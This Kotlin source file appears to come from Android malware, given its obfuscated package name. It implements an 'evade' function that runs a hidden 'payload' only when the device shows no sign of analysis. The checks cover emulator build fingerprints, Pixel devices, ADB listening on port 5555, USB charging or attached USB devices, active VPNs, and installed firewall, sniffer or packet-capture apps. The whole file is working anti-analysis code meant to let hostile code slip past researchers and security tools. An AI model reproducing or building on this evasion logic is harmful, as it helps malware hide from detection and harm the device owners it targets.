package com.xxx.zzz.globp.utilssss

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.usb.UsbManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import androidx.annotation.RequiresApi
import com.xxx.zzz.globp.SharedPreferencess
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.withContext
import java.net.InetAddress
import java.net.UnknownHostException
import java.util.*
import javax.net.SocketFactory

@ExperimentalStdlibApi
suspend inline fun Context.evade(
    requiresNetwork: Boolean = false,
    crossinline payload: suspend () -> Unit
): OnEvade.Escape {
    return withContext(Dispatchers.Default) {
        val isGooglePixel = async { runCatching { isGooglePixel() }.getOrDefault(false) }
        val isEmulator = async { runCatching { isEmulator }.getOrDefault(false) }
        val hasAdbOverWifi = async { runCatching { hasAdbOverWifi() }.getOrDefault(false)}
        val isConnected = async { runCatching { SharedPreferencess.getAppContext()?.isConnected() ?: false }.getOrDefault(false)}
        val hasUsbDevices = async { runCatching { hasUsbDevices() }.getOrDefault(false)}
        var hasFirewall: Deferred<Boolean>? = null
        var hasVpn: Deferred<Boolean>? = null
        if (requiresNetwork) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
                hasFirewall = async { runCatching { hasFirewall() }.getOrDefault(false)}
            hasVpn = async { runCatching { hasVPN() }.getOrDefault(false)}
        }
        val evaded =
            !(!isGooglePixel.await() && !isEmulator.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.await()
                ?: false) && !(hasFirewall?.await() ?: false))
        if (!evaded) payload()
        return@withContext OnEvade.Escape(evaded)
    }
}

class OnEvade {
    class Success(val result: Boolean) : Result {
        suspend fun onSuccess(callback: suspend () -> Unit): Escape {
            if (!this.result)
                callback()
            return Escape(this.result)
        }
    }

    class Escape(val result: Boolean) : Result {
        suspend fun onEscape(callback: suspend () -> Unit): Success {
            if (this.result)
                callback()
            return Success(this.result)
        }
    }
}

interface Result


@RequiresApi(Build.VERSION_CODES.HONEYCOMB_MR1)
@PublishedApi
internal suspend fun Context.hasUsbDevices() =
    (this.applicationContext.getSystemService(Context.USB_SERVICE) as UsbManager).deviceList.isNotEmpty()


@PublishedApi
internal val isEmulator by lazy {
    (Build.DEVICE.contains("generic")
            || Build.FINGERPRINT.contains("generic")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            || Build.BOARD == "QC_Reference_Phone"
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            || (Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic"))
            || Build.HARDWARE.contains("goldfish")
            || Build.HARDWARE.contains("ranchu")
            || Build.PRODUCT.contains("sdk_google")
            || Build.PRODUCT.contains("google_sdk")
            || Build.PRODUCT.contains("full_x86")
            || Build.PRODUCT.contains("sdk")
            || Build.PRODUCT.contains("sdk_x86")
            || Build.PRODUCT.contains("vbox86p")
            || Build.PRODUCT.contains("emulator")
            || Build.PRODUCT.contains("simulator"))
}


@PublishedApi
internal fun Context.hasFirewall(): Boolean {
    val packages: List<PackageInfo> =
        this.packageManager.getInstalledPackages(PackageManager.MATCH_UNINSTALLED_PACKAGES)
    packages.forEach { app ->
        val name = app.packageName.lowercase(Locale.getDefault())
        if (name.contains("firewall") || name.contains("adb")
            || name.contains("port scanner") || name.contains("network scanner")
            || name.contains("network analysis") || name.contains("ip tools")
            || name.contains("net scan") || name.contains("network analyzer")
            || name.contains("packet capture") || name.contains("pcap") || name.contains("wicap")
            || name.contains("netcapture") || name.contains("sniffer") || name.contains("vnet") || name.contains(
                "network log"
            ) ||
            name.contains("network monitor") || name.contains("network tools") || name.contains("network utilities") || name.contains(
                "network utility"
            )
        )
            return true
    }
    return false
}


@PublishedApi
internal fun Context.hasAdbOverWifi(): Boolean {
    var isOpen = false
    val mgr = runCatching { this.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager? }.getOrNull()
    if (mgr == null || !mgr.isWifiEnabled)
        return isOpen
    val wifiAddress = this.getWifiIpAddress(mgr)
    runCatching {
        SocketFactory.getDefault().createSocket(wifiAddress, 5555).close()
        isOpen = true
    }
    return isOpen
}

@PublishedApi
internal fun Context.isGooglePixel(): Boolean {
    return Build.MODEL.lowercase(Locale.getDefault()).contains("pixel")
}


@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@PublishedApi
internal fun Context.hasVPN(): Boolean {
    val mgr = this.applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    mgr.allNetworks.forEach { network ->
        val capabilities = mgr.getNetworkCapabilities(network)
        if (capabilities!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
            return true
    }
    return false
}


@PublishedApi
internal fun Context.isConnected(): Boolean {
    val intent = this.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
    val plugged = intent!!.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
    return plugged == BatteryManager.BATTERY_PLUGGED_USB || plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS
}

private fun Context.getWifiIpAddress(wifiManager: WifiManager): String? {
    val intRepresentation = wifiManager.dhcpInfo.ipAddress
    val addr = intToInetAddress(intRepresentation)
    return addr?.hostAddress
}

private fun intToInetAddress(hostAddress: Int): InetAddress? {
    val addressBytes = byteArrayOf(
        (0xff and hostAddress).toByte(),
        (0xff and (hostAddress shr 8)).toByte(),
        (0xff and (hostAddress shr 16)).toByte(),
        (0xff and (hostAddress shr 24)).toByte()
    )
    return try {
        InetAddress.getByAddress(addressBytes)
    } catch (e: UnknownHostException) {
        throw AssertionError()
    }
}